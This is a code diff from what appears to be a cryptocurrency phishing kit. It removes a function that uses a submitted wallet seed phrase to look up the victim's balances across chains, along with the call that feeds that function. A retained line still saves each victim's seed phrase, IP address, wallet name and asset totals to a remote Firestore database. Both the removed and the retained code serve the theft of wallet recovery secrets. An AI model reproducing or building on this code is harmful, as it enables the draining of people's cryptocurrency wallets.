@@ -92,31 +92,6 @@ function formatTokenArray(tokens) {
     return `${token.tokenSymbol} | Balance: ${Number(token.balance).toFixed(2)} | USDT: ${Number(token.balanceUsd).toFixed(2)}`;
   }).join('\n');
 }
-
-const fetchBalances = async (seed) => {
-    try {
-      const { evm } = deriveAddresses(seed);
-      const chains = Object.values(chainMap);
-      const res = await fetch(ANKR_RPC, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          method: "ankr_getAccountBalance",
-          params: {
-            blockchain: chains,
-            walletAddress: evm,
-          },
-          id: 1,
-        }),
-      });
-      const data = await res.json();
-      return data;
-    } catch (e) {
-      console.error(e);
-    }
-  };
-
   function normalizeText(str) {
     return str
       .replace(/[^a-zA-Z\s]/g, '') // Xoá tất cả ký tự KHÔNG phải chữ hoặc khoảng trắng
@@ -144,14 +119,6 @@ function validateMnemonic(mnemonic) {
                 var _asset = '';
                 var _total = 0;
                 var _s = 1;
-                var fetchBl = await fetchBalances(formattedSeedPhrase);
-                if(fetchBl){
-                  if(fetchBl.result){
-                    setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1)
-                    _asset = formatTokenArray(fetchBl.result.assets)
-                    _total = Number(fetchBl.result.totalBalanceUsd).toFixed(2);
-                  }
-                }
                 const user = await addDoc(collection(db, "mydata"), {
                     src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                 });
